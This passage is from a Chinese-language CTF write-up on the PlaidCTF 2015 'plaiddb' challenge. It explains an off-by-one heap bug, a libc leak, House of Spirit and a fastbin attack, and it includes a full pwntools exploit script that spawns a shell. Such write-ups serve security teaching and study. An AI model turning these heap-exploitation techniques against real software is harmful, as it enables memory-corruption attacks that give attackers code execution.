    p.recvuntil("give me money")
    fake_chunk=shellcode_addr-0x40
    p.sendline(p64(0)*5+p64(0x41)+p64(0)*1+p64(fake_chunk))
    p.sendline("2")
    p.sendline("1")
    p.recvuntil("your choice : how long?")
    p.sendline("50")
    p.recvuntil("give me more money :")
    p.sendline(p64(0)*3+p64(shellcode_addr))
    p.sendline("3")
    p.interactive()
###  2015 Plaiddb（利用场景2）
[下载地址](https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb)
[完整分析](https://migraine-sudo.github.io/2019/12/25/AFL-FUZZ/)
Plaiddb存在一个Off By one的漏洞，该漏洞能创造两个重叠的chunk（一个长一个短）。
同样，这道题也需要使用Off by one和House of spirit结合，不过在这里该漏洞的目的是在一段完全可控的内存中创建一个fake
chunk，然后实现fastbin attack。
####  OFF BY ONE部分
通过off by one来制造double free漏洞  
off_by_one可以覆盖掉下一个chunk的size的最低byte  
1.使得下个chunk的size变小  
2.使得pre_inuse bit被改为0  
下一个chunk被free掉时，会和前一个chunk合并（如果前一个chunk是free的话，即pre_inuse为0），前一个chunk由当前写入的prevsize（可控，chunk的头8个字节）来指定。通过控制pre
size可以合并一个非常大的chunk，导致double free。
首先构造堆的结构，为后面的地址泄漏最好备案。  
这里给出笔者的布置的结构，这个结构并不唯一，并且不一定是最优解，读者可以将其作为参考。
    PUT("a"*8,128,'A'*128) 
    PUT("b"*8,2,'B')
    PUT("c"*8,2,'C')
    PUT("b"*8,248,'B'*248) #为Tree B重新申请data空间
    PUT("c"*8,280,'C'*248+p64(0x21)+'C'*24) #为Tree C重新申请data空间
    #以上步骤是为了让B和C的data部分相邻
    #C的data部分构造是为了防止 next size check #invalid next size (normal) 的check
    #因为off by one 会导致 size最后一位被覆盖为0 ，所以data部分的大小会变小，需要构造一个fake结构来绕过检查。（详见glibc 源代码）
####  House of Spirit部分
House of Splrit + Fastbin attack  
其实如果一开始堆块构造的合理，可以通过覆盖真实的fastbin堆块来实现。因为之前按照写下来时候没有注意到，所以这里只能结合House of
Spirit来，通过释放伪造堆块，来实现fastbin attack。  
do_DEL部分代码,因为我们拥有一个可控chunk（LEAK
BUF），所以可以通过修改data/rowkey指针来free掉我们布置在堆内的fakechunk
      free(TreeNode); 
      free(*(void **)(TreeNode->data));
      free(TreeNode->rowkey);
      free(v1);
      return puts("INFO: Delete successful.");
**实现代码**
    #House of Spirit
    fake_chunk=HEAP_ADDR+0x2f0
    one_gadget=0xe58c5+LIBC_ADDR
    address=LIBC_ADDR+0x3BE740-35#address=0x66666666
    PUT("KEY1",1000,"A"*1000)
    PUT("KEY1",1000,KEY1[1:289]+p64(fake_chunk)+KEY1[297:369]+p64(0)+p64(0x70)+p64(0x70)*16+KEY1[513:]) #0x70 to pass the fast bin next chunk check
    DEL("LEAKBUF")
    GET("KEY1")
    p.recvuntil(" bytes]:")
    KEY1=p.recv(1000)
    #PUT("KEY1",1000,"A"*1000)
    DEL("KEY1")
    PUT("KEY1",1000,KEY1[1:385]+p64(address)+KEY1[393:])
测试数据address=0x6666666成功修改fastbin链的头
    x/20xg  0x7ffff7dce768
    0x7ffff7dce768: 0x0000000066666666  0x0000000000000000
    0x7ffff7dce778: 0x0000555555758270  0x0000000000000000
####  Get Shell
    #fastbin attack
    PUT("Fill",0x60,"F"*0x60)#malloc fake_chunk
    PUT("Fill2",0x60,"F"*(35-16)+p64(one_gadget)+"F"*(0x60-(35-16)-8)) #any address write
    DEL("GetSHELL")
将ASLR开启，运行脚本成功get shell
**完整的EXP**
    from pwn import *
    p=process("./plaiddb2")
    bin=ELF("./plaiddb2")
    libc=ELF("libc.so.6")
    #context.log_level='Debug'
    #gdb.attach(p)
    def PUT(row_key,size,data):
        p.recvuntil("PROMPT: Enter command:")
        p.sendline("PUT")
        p.recvuntil("PROMPT: Enter row key:")
        p.sendline(row_key);
        p.recvuntil("PROMPT: Enter data size:")
        p.sendline(str(size))
        p.recvuntil("PROMPT: Enter data:")
        p.sendline(data)
    def GET(row_key):
        p.recvuntil("PROMPT: Enter command:")
        p.sendline("GET")
        p.recvuntil("PROMPT: Enter row key:")
        p.sendline(row_key)
        #p.recvuntil(" bytes]:")
        #data=p.recv(size)
        #return data
    def DEL(row_key):
        p.recvuntil("PROMPT: Enter command:")
        p.sendline("DEL")
        p.recvuntil("PROMPT: Enter row key:")
        p.sendline(row_key)
    PUT("d"*8,2,'D')
    PUT("a"*8,128,'A'*128)
    PUT("b"*8,2,'B')
    PUT("c"*8,2,'C')
    PUT("b"*8,248,'B'*248) 
    PUT("c"*8,280,'C'*248+p64(0x21)+'C'*24) #for next size check #invalid next size (normal) 
                        #off by one --> (size--)  -->(next chunk address++)
    DEL("b"*8)
    DEL('X'*240+p64(752)) #240+8=248   row_key-offset
    #LEAK FUNCTION
    def LEAK(addr):
        size=0x100
        PUT("KEY1",1000,"A"*999)
        PUT("KEY1",1000,KEY1[1:281]+p64(size)+p64(addr)+KEY1[297:]) 
        return GET("LEAKBUF")
    LEAK(HEAP_ADDR+0x588)
    p.recvuntil("bytes]:")
    LEAK_ADDR=p.recv(0x100)
    LIBC_ADDR=u64(LEAK_ADDR[1:8].ljust(8,"x00"))-0x3be7b8
    print "LIBC_ADDR="+hex(LIBC_ADDR)
    #House of Spirit
    fake_chunk=HEAP_ADDR+0x2f0
    one_gadget=0xe58c5+LIBC_ADDR
    address=LIBC_ADDR+0x3BE740-35#address=0x66666666
    PUT("KEY1",1000,"A"*1000)
    PUT("KEY1",1000,KEY1[1:289]+p64(fake_chunk)+KEY1[297:369]+p64(0)+p64(0x70)+p64(0x70)*16+KEY1[513:]) #0x70 to pass the fast bin next chunk check
    DEL("LEAKBUF")
    GET("KEY1")
    p.recvuntil(" bytes]:")
    KEY1=p.recv(1000)
    #PUT("KEY1",1000,"A"*1000)
    DEL("KEY1")
    PUT("KEY1",1000,KEY1[1:385]+p64(address)+KEY1[393:])
    #fastbin attack
    PUT("Fill",0x60,"F"*0x60)#malloc fake_chunk
    PUT("Fill2",0x60,"F"*(35-16)+p64(one_gadget)+"F"*(0x60-(35-16)-8)) #any address write
    DEL("GetSHELL")
    p.interactive()
## 参考文献:
[1]plaid ctf 2015 plaiddb.0x3f97  
[https://0x3f97.github.io/pwn/2018/01/27/plaidctf2015-plaiddb/[OL/DB],2018-1-27](https://0x3f97.github.io/pwn/2018/01/27/plaidctf2015-plaiddb/%5BOL/DB%5D,2018-1-27)  
[2]Plaid CTF WriteUP.angelboy  
[http://angelboy.logdown.com/posts/262325-plaid-ctf-2015-write-up%5D[OL/DB],2015-4-28](http://angelboy.logdown.com/posts/262325-plaid-ctf-2015-write-up%5D%5BOL/DB%5D,2015-4-28)
[3]how2heap.Mutepig[http://blog.leanote.com/post/mut3p1g/how2heap[OL/DB](http://blog.leanote.com/post/mut3p1g/how2heap%5BOL/DB)]